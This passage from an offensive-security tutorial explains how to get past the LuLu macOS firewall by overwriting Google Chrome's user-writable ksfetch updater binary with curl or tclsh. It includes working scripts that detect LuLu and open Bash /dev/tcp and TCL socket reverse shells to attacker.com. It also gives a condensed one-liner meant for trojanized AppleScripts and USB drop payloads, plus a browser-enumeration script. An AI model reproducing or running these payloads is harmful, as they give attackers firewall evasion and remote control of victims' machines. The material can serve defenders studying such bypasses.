The bypass is made possible due to weak file and directory permissions assigned to some third-party applications installed outside the App Store. Let's have a look at file permissions for the Google Chrome browser, which was installed directly from Google via DMG installer.


```
$ ls -l /Applications/

total 0
drwxr-xr-x   3 root       admin    96B Jun 12 03:23 1Password 7.app
drwxr-xr-x@  3 root       wheel    96B Aug 18  2018 Calculator.app
drwxr-xr-x@  3 root       wheel    96B Aug 18  2018 FaceTime.app
drwxr-xr-x@  3 tokyoneon  admin    96B Jun  4 08:50 Google Chrome.app
drwxr-xr-x@  3 root       wheel    96B Aug 18  2018 Home.app
drwxr-xr-x@  3 root       wheel    96B Aug 18  2018 Image Capture.app
```

Notice the Google Chrome app is owned by the user and not "root" like other applications. And with another look at the `ksfetch` and `GoogleSoftwareUpdateAgent` rules in LuLu, we'll notice both of the binaries are in the `/Users/$USER/Library/` directory.

In addition to other files in the Chrome directory, these binaries modifiable by the user. To be clear, any files in `/Users/$USER/Library/` and `/Application/Google\ Chrome.app/` are fair game for an attacker and easily modified.

The below command will override `ksfetch` with `curl`, which is not whitelisted in the LuLu firewall.

```
$ cp /usr/bin/curl /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch
```

Despite Curl not being whitelisted, an attacker can still access the internet this way.

```
$ /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch "https://ifconfig.me/all"

ip_addr: 198.251.89.219
remote_host: unavaiable
user_agent: curl/7.54.0
port: 28596
language:
referer:
connection:
keep_alive:
method: GET
encoding:
mime: */*
charset:
via: 1.1 google
forwarded: 198.251.89.219, 216.239.36.21~
```

Ksfetch is used in this example, but `GoogleSoftwareUpdateAgent` and Google Chrome itself can be used to establish connections to a remote server. Overriding Chrome will, of course, break the applicationâ€™s functionalities. But at that point, an attacker would have already exfiltrated sensitive information. With this knowledge, let's setup a reverse shell payload and remotely control the MacBook.

The following example utilizes `tclsh`, which will create an interactive shell the attacker can use to execute commands remotely. For good measure, the `tclsh` binaries and symlinks have been manually blocked in the firewall.

![](img/lulu02.jpg)

As a low privileged user, the `tclsh` binary is copied over `ksfetch`, which completely overrides the file and its functionalities.

```
$ cp /usr/bin/tclsh /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch
```

The `tclsh` command is now invoked by directly calling the `ksfetch` binary. From this interactive terminal, commands are executed exactly as they would be with a Netcat or Bash shell.

```
$ /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch

### Design the Payload with Active Evasion

So, how would an attacker know if the operating system has LuLu installed to begin with? It's possible to enumerate installed security software by performing packet inspection and observing LuLu's auto-updates. However, we'll instead have the payload detect LuLu processes before executing any commands.

In the below example, background processes are examined with `ps`. Several active processes appear using the "LuLu" name.

```
$ ps auxwww | grep -i [l]ulu

root                94   0.3  0.7  4349052  28088   ??  Rs    1:33AM   0:18.59 /Library/Objective-See/LuLu/LuLu.bundle/Contents/MacOS/LuLu
tokyoneon          291   0.0  0.8  4924936  35092   ??  S     1:34AM   0:01.10 /Applications/LuLu.app/Contents/Library/LoginItems/LuLu Helper.app/Contents/MacOS/LuLu Helper
```

A simple Bash `if` statement, embedded in an AppleScript, could effectively detect the LuLu processes.

```bash
#!/bin/bash

if [[ ! "$(/bin/ps auxwww | /usr/bin/grep -i [l]ulu)" ]]; then
    echo "LuLu not found."
else
    echo "LuLu detected."
fi
```

A practical script that goes beyond detecting LuLu processes and automatically overrides Google Chrome binaries could appear as follows.

```bash
#!/bin/bash

# The `ps` command is used to view active processes and
# locate LuLu running in the background with `grep`.
if [[ ! "$(/bin/ps auxwww | /usr/bin/grep -i [l]ulu)" ]]; then

    # An arbitrary `echo` command. If LuLu is not found the
    # following commands will execute. An example Bash
    # reverse shell is included.
    echo "LuLu not found. Hack the planet!"
    /bin/bash -i >& /dev/tcp/attacker.com/443 0>&1
else
    # Arbitrary `echo` command with sad face.
    echo "Lulu detected :("

    # Copy the `tclsh` binary over `ksfetch`.
    /bin/cp /usr/bin/tclsh /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch

    # TCL reverse shell, covered in the below article.
    # https://null-byte.com/tcl-0186330/
    echo 'set s [socket attacker.com 443];while 42 { puts -nonewline $s "hacker> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch &

    # Another `echo` command.
    echo "Bypass LuLu and hack the planet!"
fi
```

The above script is condensed into one-line to function nicely with trojanized AppleScripts, [Mousejack payloads](/0x03), [USB drops](/0x01), and USB Rubber Ducky payloads.

```bash
if [[ ! "$(/bin/ps auxwww | /usr/bin/grep -i [l]ulu)" ]]; then /bin/bash -i >& /dev/tcp/attacker.com/443 0>&1; else /bin/cp /usr/bin/tclsh /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch && echo 'set s [socket attacker.com 443];while 42 { puts -nonewline $s "hacker> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | /Users/$USER/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/ksfetch & fi
```

If Chrome isn't installed on the target system, a different dependency of an alternate browser is enumerable with some effort. Discovering the installed browser(s) could appear as shown below.

```bash
#!/bin/bash

if [[ ! -n "$(/bin/ps auxwww | /usr/bin/grep -i [l]ulu)" ]]; then
	echo "LuLu not found.";
else
	echo "LuLu detected.";
	if [[ -d "/Applications/Google Chrome.app/" ]]; then
		echo "Chrome browser detected. Overriding Ksfetch...";
	else
		if [[ -d "/Applications/Firefox.app/" ]]; then
			echo "Firefox detected. Overriding <unknown>...";
		else
			if [[ -d "/Applications/Opera.app/" ]]; then
				echo "Opera detected. Overriding <unknown>...";
			else
				echo "Uh-oh, we're out of browsers to exploit...";
			fi;
		fi;
	fi;
fi

```
